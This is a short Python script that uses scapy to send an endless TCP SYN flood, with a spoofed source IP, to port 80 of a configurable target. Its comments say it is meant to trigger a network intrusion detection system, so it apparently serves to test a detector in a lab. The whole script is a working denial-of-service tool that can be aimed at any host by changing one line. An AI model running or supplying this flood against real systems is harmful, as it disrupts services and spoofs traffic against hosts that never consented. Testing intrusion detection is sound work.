from scapy.all import send, IP, TCP, UDP
import time

# CONFIGURATION
# ⚠️ REPLACE WITH YOUR NIDS IP (The one you saw in the logs)
TARGET_IP = "10.31.94.148" 
FAKE_IP = "10.10.10.10"

print(f"🔥 LAUNCHING HEAVY FLOOD ON {TARGET_IP}...")
print(f"💣 Attacker IP: {FAKE_IP}")
print("Press Ctrl+C to Stop")

counter = 0

try:
    while True:
        # ATTACK 1: HTTP FLOOD (TCP SYN)
        # We send these as fast as possible to trigger the 'count' feature
        packet = IP(src=FAKE_IP, dst=TARGET_IP)/TCP(dport=80, flags="S")
        send(packet, verbose=0)
        
        counter += 1
        if counter % 100 == 0:
            print(f"⚡ Sent {counter} packets...", end="\r")

except KeyboardInterrupt:
    print("\n🛑 Attack Stopped.")